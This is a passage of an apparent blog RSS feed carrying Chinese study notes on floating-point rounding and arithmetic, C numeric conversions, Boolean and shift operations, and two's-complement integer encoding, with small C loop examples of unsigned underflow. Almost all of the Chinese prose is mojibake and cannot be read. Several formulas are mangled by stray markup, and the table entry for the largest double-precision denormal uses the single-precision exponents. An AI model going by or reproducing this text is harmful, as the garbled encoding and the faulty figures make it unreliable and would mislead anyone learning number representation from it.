&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;![](attachments/Pasted image%2020250116000313.png%20)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;å®Œæ•´èŒƒå›´:&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250116001055.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;åœ¨-1.0~1.0é™„è¿‘:&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250116001115.png&quot; alt=&quot;&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1&gt;æµ®ç‚¹è¿ç®—&lt;/h1&gt;
&lt;h2&gt;èˆå…¥(Round)&lt;/h2&gt;
&lt;h3&gt;åŸºæœ¬æ€æƒ³&lt;/h3&gt;
&lt;p&gt;é¦–å…ˆè®¡ç®—ç²¾ç¡®å€¼,ç„¶åæŒ‰éœ€è¦çš„ç²¾åº¦èˆå…¥&lt;/p&gt;
&lt;h3&gt;èˆå…¥æ–¹å¼&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;å‘0å››èˆäº”å…¥&lt;/li&gt;
&lt;li&gt;å‘ä¸‹(-âˆ)å››èˆäº”å…¥&lt;/li&gt;
&lt;li&gt;å‘ä¸Š(+âˆ)å››èˆäº”å…¥&lt;/li&gt;
&lt;li&gt;å››èˆäº”å…¥å¶æˆåŒ
  è¿™æ˜¯é»˜è®¤æ–¹å¼.å³å¤§äºä¸­é—´æ•°(åœ¨åè¿›åˆ¶ä¸‹æ˜¯5,åœ¨äºŒè¿›åˆ¶ä¸‹æ˜¯1)çš„å‘ä¸Šå…¥,å°äºä¸­é—´æ•°çš„å‘ä¸‹èˆ,ç­‰äºä¸­é—´æ•°çš„å‘å¶æ•°èˆå…¥.
  å¯¹äºåè¿›åˆ¶:
  $$ Rou nd(7.8949999,2) = 7.89 $$
  $$ Rou nd(7.8950001,2) = 7.90 $$
  $$ Rou nd(7.8950000,2) = 7.90 $$
  $$ Rou nd(7.8850000,2) = 7.88 $$
  å¯¹äºäºŒè¿›åˆ¶ä¹Ÿç±»ä¼¼:
  $$Rou nd(10.00\ 011,2) = 10.00 $$
  $$Rou nd(10.00\ 110,2) = 10.01 $$
  $$Rou nd(10.11\ 100,2) = 11.00 $$
  $$Rou nd(10.10\ 100,2) = 10.10 $$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åŠ æ³•(addtion)&lt;/h2&gt;
&lt;p&gt;$$(-1)^{s_{1}} M_{1} 2^{E_{1}} + (-1)^{s_{2}} M_{2} 2^{E_{2}}$$
å‡è®¾E1&amp;gt;E2
ç²¾ç¡®ç»“æœä¸º
$$(-1)^{s} M\  2^{E} $$
å…¶ä¸­:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¬¦å·sç”±å¯¹é½åçš„ç¬¦å·å†³å®š.&lt;/li&gt;
&lt;li&gt;å°¾æ•°Må¯¹é½åç›¸åŠ çš„ç»“æœ&lt;/li&gt;
&lt;li&gt;æŒ‡æ•°Eæ˜¯E1
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250116175507.png&quot; alt=&quot;&quot;&gt;
è°ƒæ•´:&lt;/li&gt;
&lt;li&gt;å¦‚æœM&amp;gt;=2,å³ç§»M,ç„¶åEå¢åŠ 1&lt;/li&gt;
&lt;li&gt;å¦‚æœM&amp;lt;1,å·¦ç§»kä½,Eå‡å°k&lt;/li&gt;
&lt;li&gt;å¦‚æœEæº¢å‡º,æº¢å‡ºä¸ºæ— ç©·&lt;/li&gt;
&lt;li&gt;èˆå…¥Mä½¿å¾—ç¬¦åˆfracä½ç²¾åº¦è¦æ±‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯¹é½é‚£æ ·çš„å¤„ç†æ–¹æ³•å¯¼è‡´äº†ä¸€ä¸ªç‰¹æ€§,å°±æ˜¯ä¸ç¬¦åˆåŠ æ³•ç»“åˆå¾‹:
&lt;code&gt;(3.14+1e10)-1e10 = 0, 3.14+(1e10-1e10) = 3.14&lt;/code&gt;
ç¬¦åˆåŠ æ³•äº¤æ¢å¾‹&lt;/p&gt;
&lt;h2&gt;ä¹˜æ³•(multiplication)&lt;/h2&gt;
&lt;p&gt;$$(-1)^{s_{1}} M_{1} 2^{E_{1}} \times (-1)^{s_{2}} M_{2} 2^{E_{2}}$$
ç²¾ç¡®ç»“æœä¸º
$$(-1)^{s} M\  2^{E} $$
å…¶ä¸­:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¬¦å·ä½s: s1^ s2&lt;/li&gt;
&lt;li&gt;å°¾æ•°M:M1Ã—M2&lt;/li&gt;
&lt;li&gt;æŒ‡æ•°E:E1+E2
è°ƒæ•´:&lt;/li&gt;
&lt;li&gt;å¦‚æœM&amp;gt;=2,å³ç§»M,ç„¶åEå¢åŠ 1&lt;/li&gt;
&lt;li&gt;å¦‚æœEæº¢å‡º,æº¢å‡ºä¸ºæ— ç©·&lt;/li&gt;
&lt;li&gt;èˆå…¥Mä½¿å¾—ç¬¦åˆfracä½ç²¾åº¦è¦æ±‚
ç±»ä¼¼äºæµ®ç‚¹æ•°åŠ æ³•çš„ç‰¹æ€§,æµ®ç‚¹æ•°ä¹˜æ³•å¯èƒ½ä¸ç¬¦åˆä¹˜æ³•ç»“åˆå¾‹å’Œä¹˜æ³•åˆ†é…å¾‹
&lt;code&gt;(1e20*1e20)*1e-20 = inf, 1e20*(1e20*1e-20) = 1e20&lt;/code&gt;
&lt;code&gt;1e20*(1e20-1e20) = 0.0, 1e20*1e20-1e20*1e20 = NaN&lt;/code&gt;
ä¸è¿‡,åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹,åªè¦å·®è·ä¸æ˜¯è¿™ä¹ˆæ‚¬æ®Š,ä¸å¯¹infå’ŒNaNå®æ•°è¿ç®—,æ•°å­¦è§„å¾‹éƒ½æ˜¯é€‚ç”¨çš„.
å¯ä»¥ä¿è¯å¯¹äº
$$ a\geq b ;&amp;amp; ; c\geq 0 \Rightarrow a&lt;em&gt;c\geq b&lt;/em&gt;c$$
$$ a\geq b ;&amp;amp; ; c\leq 0 \Rightarrow a&lt;em&gt;c\leq b&lt;/em&gt;c$$
$$ a\ne NaN \Rightarrow a*a \geq 0$$&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Cè¯­è¨€ä¸­çš„æµ®ç‚¹æ•°&lt;/h1&gt;
&lt;p&gt;Cè¯­è¨€æä¾›äº†ä¸¤ç§ä¸åŒçš„æµ®ç‚¹æ•°:å•ç²¾åº¦floatå’ŒåŒç²¾åº¦double
åœ¨int,float,doubleç±»å‹ä¹‹é—´è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶.åŸåˆ™å¦‚ä¸‹:
ä¸signedå’Œunsignedç±»å‹ç›¸äº’è½¬æ¢ä¸ä¼šæ”¹å˜æ¯”ç‰¹ä½ä¸åŒçš„æ˜¯,è¿™é‡Œæ¯”ç‰¹ä¼šå‘ç”Ÿå®è´¨æ€§çš„æ”¹å˜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;double/float -&amp;gt; int&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç›´æ¥æˆªå»å°æ•°éƒ¨åˆ†&lt;/li&gt;
&lt;li&gt;å‘0èˆå…¥&lt;/li&gt;
&lt;li&gt;è¶…è¿‡intèŒƒå›´æˆ–è½¬æ¢NaNæ—¶æ˜¯æœªå®šä¹‰è¡Œä¸º:é€šå¸¸ç½®ä¸ºTMin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;int/float -&amp;gt; double
  å› ä¸ºdoubleæœ‰æ›´å¤§çš„èŒƒå›´,ä¹Ÿæœ‰æ›´å¤§çš„ç²¾åº¦,æ‰€ä»¥èƒ½å¤Ÿä¿è¯æ˜¯ç²¾ç¡®å€¼&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;int -&amp;gt; float
  æ•°å­—ä¸ä¼šæº¢å‡º,ä½†æ˜¯å¯èƒ½è¢«èˆå…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;double -&amp;gt;float&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å› ä¸ºfloatèŒƒå›´æ›´å°,æ‰€ä»¥å¯èƒ½æº¢å‡ºä¸º+âˆæˆ–-âˆ;å› ä¸ºç²¾åº¦æ›´å°,æ‰€ä»¥å¯èƒ½è¢«èˆå…¥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æµ®ç‚¹æ•°çš„èŒƒå›´&lt;/h2&gt;
&lt;p&gt;è¡¥å……ä¸€ä¸‹æµ®ç‚¹æ•°èƒ½å¤Ÿè¡¨ç¤ºçš„èŒƒå›´&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å•ç²¾åº¦æµ®ç‚¹æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ¼å¼&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;æœ€å°å€¼&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;æœ€å¤§å€¼&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;è§„æ ¼åŒ–&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$2^{127} Ã—(2-2^ {-23})\approx 3.4\times 10^{38}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;éè§„æ ¼åŒ–&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-23}\times 2^{-126}=2^{-149}\approx 1.4 \times 10^{-45}$$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} Ã—(1-2^ {-23}) \approx 1.18\times_{1}0^{-38}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;åŒç²¾åº¦æµ®ç‚¹æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ¼å¼&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;æœ€å°å€¼&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;æœ€å¤§å€¼&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;è§„æ ¼åŒ–&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-1022} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$2^{1023} Ã—(2-2^ {-52})\approx  1.8\times 10^{308}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;éè§„æ ¼åŒ–&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-52}\times 2^{-1022}=2^{-1074} \approx 4.9\times 10^{-324} $$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;$$ 2^ {-126} Ã—(1-2^ {-23})\approx 2.2\times 10^{-308}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 14 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æ¯”ç‰¹,å­—èŠ‚å’Œæ•´å‹</title><link>https://www.tankimzeg.top/blog/%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E5%92%8C%E6%95%B4%E5%9E%8B-bits-bytes-and-integers/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E5%92%8C%E6%95%B4%E5%9E%8B-bits-bytes-and-integers/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E5%92%8C%E6%95%B4%E5%9E%8B-bits-bytes-and-integers/&quot;&gt;https://www.tankimzeg.top/blog/%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E5%92%8C%E6%95%B4%E5%9E%8B-bits-bytes-and-integers/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ç”¨bitsè¡¨ç¤ºä¿¡æ¯&lt;/h1&gt;
&lt;p&gt;åœ¨è®¡ç®—æœºä¸­,ä¸€åˆ‡éƒ½æ˜¯bits
æ¯ä¸ªbitæ˜¯0æˆ–1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸ºä»€ä¹ˆé‡‡ç”¨bit?&lt;ul&gt;
&lt;li&gt;æ˜“äºå­˜å‚¨&lt;/li&gt;
&lt;li&gt;åœ¨å™ªå£°å’Œç”µçº¿ä¸­ä¼ è¾“å¯é .ä¾‹å¦‚,å¯ä»¥é¢„è®¾é«˜ç”µå‹è¡¨ç¤º1,ä½ç”µå‹è¡¨ç¤º0,ç›¸æ¯”äºåè¿›åˆ¶åˆ†æˆ10ä»½,è¿™æ ·çš„æŠ—å¹²æ‰°èƒ½åŠ›è‚¯å®šæ›´å¼º&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤º:
æ•´æ•°å’Œæµ®ç‚¹æ•°çš„å°æ•°ç‚¹å·¦è¾¹æ˜¯$2^0,2^1,2^2,...$&lt;br&gt;æµ®ç‚¹æ•°çš„å°æ•°ç‚¹å³è¾¹æ˜¯$2^{-1},2^{-2},2^{-3},...$
è¿™æ ·ä¾æ¬¡å±•å¼€.&lt;/p&gt;
&lt;h2&gt;å­—èŠ‚&lt;/h2&gt;
&lt;p&gt;1byte = 8 bits
é‡‡ç”¨åå…­è¿›åˆ¶,ä¸€ä¸ªå­—ç¬¦ç›¸å½“äº4 bits,æ‰€ä»¥ä¸€å­—èŠ‚ç›¸å½“äº2ä½åå…­è¿›åˆ¶æ•°,ä»00åˆ°ff&lt;/p&gt;
&lt;h2&gt;cè¯­è¨€ä¸­çš„æ•°æ®è¡¨ç¤º&lt;/h2&gt;
&lt;p&gt;![](attachments/pasted image%2020250113125129.png%20)&lt;/p&gt;
&lt;h1&gt;ä½è¿ç®—&lt;/h1&gt;
&lt;h2&gt;å¸ƒå°”ä»£æ•°&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;ä¸ and&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;amp;&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2. æˆ– or&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&amp;amp;#124&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3. é not&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;~|
--|--
0|1
1|0&lt;/p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;å¼‚æˆ– Xor&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;^&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;ä½ç§»è¿ç®—&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;å·¦ç§» &amp;lt;&amp;lt;
å»æ‰å·¦è¾¹å¤šä½™çš„ä½ï¼Œå³è¾¹ä½ä½å¡«0&lt;/li&gt;
&lt;li&gt;å³ç§» &amp;gt;&amp;gt;
å»æ‰å³è¾¹å¤šä½™çš„ä½ï¼Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹äºé€»è¾‘ä½ç§»:
 å·¦è¾¹å¡«0&lt;/li&gt;
&lt;li&gt;å¯¹äº&lt;strong&gt;ç®—æœ¯ä½ç§»&lt;/strong&gt;:
å¡«å·¦è¾¹çš„æ ‡å¿—ä½,å³
æ­£æ•°:éƒ½æ˜¯å¡«0
è´Ÿæ•°çš„è¡¥ç :é«˜ä½å¡«1&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;æœªå®šä¹‰çš„è¡Œä¸º
ç§»åŠ¨çš„ä½æ•°å°äº0æˆ–è€…å¤§äºå­—é•¿(å¯èƒ½æ˜¯ç§»åŠ¨å–æ¨¡åçš„ä½æ•°)&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;æ•´æ•°çš„è¡¨ç¤º&lt;/h1&gt;
&lt;h2&gt;ç¼–ç æ•´æ•°&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹äºunsignedç±»å‹
$$ Bit2Unsigned(X) = \sum_{i=0}^{w-1} x_i \cdot 2^{i} $$
æ¯”å¦‚è¯´,å¯¹äº
$$ (1101)_2 = 2^0+2^2+2^3 = 1+4+8=13 $$&lt;/li&gt;
&lt;li&gt;å¯¹äºäºŒè¿›åˆ¶&lt;em&gt;&lt;strong&gt;è¡¥ç &lt;/strong&gt;&lt;/em&gt; (Two&amp;#39;s Complement)
$$ Bit2T(X) = -x_{w-1}\cdot 2^{w-1} + \sum_{i=0}^{w-2} x_i \cdot 2^{i} $$
æ¯”å¦‚è¯´,å¯¹äº
$$ (1101)_2 = 2^0+2^2-2^3 = 1+4-8=-3 $$
æœ€é«˜ä½æ˜¯ç¬¦å·ä½,0è¡¨ç¤ºéè´Ÿæ•°,1è¡¨ç¤ºè´Ÿæ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ•°å€¼èŒƒå›´&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å¯¹äºunsignedç±»å‹
$$ UMin = 0 $$
$$ 000...0 $$
$$ UMax = 2^{w}-1 $$
$$ 111...1 $$&lt;/li&gt;
&lt;li&gt;å¯¹äºäºŒè¿›åˆ¶è¡¥ç 
$$ TMin = -2^{w-1} $$
$$ 100\dots 0 $$
$$ TMax = 2^{w-1}-1 $$
$$ 011\dots 1 $$
ç‰¹åˆ«åœ°,$111...1_{2}= -1$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ç›¸äº’è½¬æ¢&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥å‘ç°ä»–ä»¬ä¹‹é—´å­˜åœ¨ä¸€ä¸€å¯¹åº”çš„å‡½æ•°å…³ç³»
é¦–å…ˆæ˜¯åå‡½æ•°çš„å…³ç³»:
$$ U2B(X) = B2U^{-1}(X) $$
$$ T2B(X) = B2T^{-1}(X) $$
å…¶æ¬¡æ˜¯Signedå’ŒUnsignedä¹‹é—´çš„å…³ç³»
![](attachments/Pasted image%2020250113191235.png%20)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ€»ç»“:åœ¨Cè¯­è¨€ä¸­,signedå’Œunsignedç›¸äº’è½¬æ¢çš„è§„åˆ™&lt;ul&gt;
&lt;li&gt;ä½ä¿æŒä¸å˜&lt;/li&gt;
&lt;li&gt;æ•°å€¼è¢«é‡æ–°é˜è¿°&lt;/li&gt;
&lt;li&gt;å¯èƒ½æœ‰æ„æƒ³ä¸åˆ°çš„æ•ˆæœ:åŠ ä¸Šæˆ–å‡å»$$ 2^w$$&lt;/li&gt;
&lt;li&gt;å½“è¡¨è¾¾å¼å«æœ‰signedå’Œunsignedç±»å‹çš„æ—¶å€™,signedä¼šå‘ç”Ÿå¼ºåˆ¶è½¬æ¢æˆunsigned&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å­—é•¿æ‹“å±•&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250114175033.png%20)
æ¯”å¦‚è¯´,å¯¹äºä¸€ä¸ªsignedç±»å‹4æ¯”ç‰¹æ•´æ•°,æ‹“å±•æˆ8æ¯”ç‰¹é•¿
$$ (-6)&lt;em&gt;{10}=(1010)&lt;/em&gt;{2}=(11111010)&lt;em&gt;{2} $$
$$ (4)&lt;/em&gt;{10}=(0100)&lt;em&gt;{2}=(00000100)&lt;/em&gt;{2} $$&lt;/p&gt;
&lt;h2&gt;å­—é•¿æˆªæ–­&lt;/h2&gt;
&lt;p&gt;å¯¹unsignedç±»å‹æˆªçŸ­å³å–æ¨¡è¿ç®—
$$ (11010)&lt;em&gt;{2} \ \ mod \ \ 2^4 = (1010)&lt;/em&gt;{2}$$
å¯¹signedç±»å‹æˆªçŸ­ä¹Ÿç±»ä¼¼äºå–æ¨¡è¿ç®—,æœ‰æ—¶ä¼šæŠŠæ­£æ•°å˜æˆè´Ÿæ•°,æœ‰æ—¶ä¼šæŠŠè´Ÿæ•°å˜æˆæ­£æ•°&lt;/p&gt;
&lt;h3&gt;æ€»ç»“:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ‹“å±•&lt;ul&gt;
&lt;li&gt;unsignedç±»å‹:å¡«0&lt;/li&gt;
&lt;li&gt;signedç±»å‹:å¡«ç¬¦å·ä½&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;æˆªæ–­&lt;ul&gt;
&lt;li&gt;unsignedç±»å‹:å–æ¨¡&lt;/li&gt;
&lt;li&gt;signedç±»å‹:ç±»ä¼¼äºå–æ¨¡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å››åˆ™è¿ç®—&lt;/h2&gt;
&lt;h3&gt;åŠ æ³•&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;unsignedç±»å‹åŠ æ³•éœ€è¦w+1ä½æ¥å®Œæ•´å­˜å‚¨,ä½†è¿™ä¼šé€ æˆæº¢å‡º,æ‰€ä»¥èˆå»æº¢å‡ºä½,å³å–æ¨¡
 $$  UAdd_{w}(u,v) = (u+v) \ \ mod \ \ 2^{w} $$&lt;/p&gt;
&lt;p&gt; å¾ˆå–œæ¬¢çš„å¯è§†åŒ–:
 ![](attachments/Pasted image%2020250114182325.png%20)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¡¥ç çš„åŠ å‡æ³•
 åŒæ ·èˆå»æº¢å‡ºä½,ä¼šå¯¼è‡´è´Ÿæº¢å‡ºå’Œæ­£æº¢å‡º(ä¸‹æº¢å’Œä¸Šæº¢)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è´Ÿæº¢å‡º
  ä¸¤ä¸ªè´Ÿæ•°çš„å’Œå°äºTMin,ä¼šå˜æˆæ­£æ•°&lt;/li&gt;
&lt;li&gt;æ­£æº¢å‡º
  ä¸¤ä¸ªæ­£æ•°çš„å’Œå¤§äºTMax,ä¼šå˜æˆè´Ÿæ•°
 æ‰€ä»¥,å¯¹äºä»¥ä¸‹è¿™ä¸¤æ®µä»£ç :&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned i;
for (i = cnt-2; i &amp;gt;= 0; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; åŠ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define DELTA sizeof(int) 
int i; 
for (i = CNT; i-DELTA &amp;gt;= 0; i-= DELTA) 
    . . .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; éƒ½ä¼šå‘ç”Ÿå¼‚å¸¸!
 æ­£ç¡®çš„åšæ³•æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;unsigned i; 
for (i = cnt-2; i &amp;lt; cnt; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; ç²¾ç›Šæ±‚ç²¾çš„æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;size_t i; 
for (i = cnt-2; i &amp;lt; cnt; i--) 
    a[i] += a[i+1];
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt; å¦‚æœcntæ˜¯signedç±»å‹å¹¶ä¸”å°äº0ä¼šæ€æ ·?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; å¾ˆå–œæ¬¢çš„å¯è§†åŒ–:
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250114183747.png&quot; alt=&quot;&quot;&gt;
 åŠ ä¸Šè´Ÿæ•°,å°±æ˜¯å‡æ³•
 è®¡ç®—ç›¸åæ•°:å…ˆå–å,å†åŠ 1
 $$-x=\ \sim x + 1$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ä¹˜æ³•&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;unsignedç±»å‹çš„ä¹˜æ³•éœ€è¦2wä½æ¥å®Œæ•´å­˜å‚¨,ä½†è¿™ä¼šé€ æˆæº¢å‡º,æ‰€ä»¥èˆå»æº¢å‡ºä½,å³å–æ¨¡
 $$ UMult_{w}(u,v) = (u \cdot v) \ \ mod \ \ 2^{w}  $$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;signedç±»å‹çš„ä¹˜æ³•åŒæ ·,ç›´æ¥èˆå»æº¢å‡ºä½,æœ‰æ—¶è¿™ä¼šå¯¼è‡´æ­£æ•°ç›¸ä¹˜å˜è´Ÿæ•°&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸¾ä¸€ä¸ªæœ‰è¶£çš„ä¾‹å­:
$$ (1101)&lt;em&gt;{2}  \ \ \ \ \ \  (signed \ \ -3/unsigned \ \ 13) $$
$$ (1110)&lt;/em&gt;{2}  \ \ \ \ \ \  (signed \ \ -2/unsigned \ \ 14) $$
$$(1101)&lt;em&gt;{2} \cdot  (1110)&lt;/em&gt;{2}= (1011 \ \  \ 0110)_{2}$$
ä½4ä½æ˜¯ 0110,åœ¨unsignedä¸­ä¸º 6.
æ‰€ä»¥,åœ¨è®¡ç®—13*14çš„ä½4ä½æ—¶,å¯ä»¥ä½œunsignedç®—&lt;/p&gt;
&lt;p&gt;ç‰¹åˆ«åœ°,
$$u\ll k == u \cdot 2^k$$
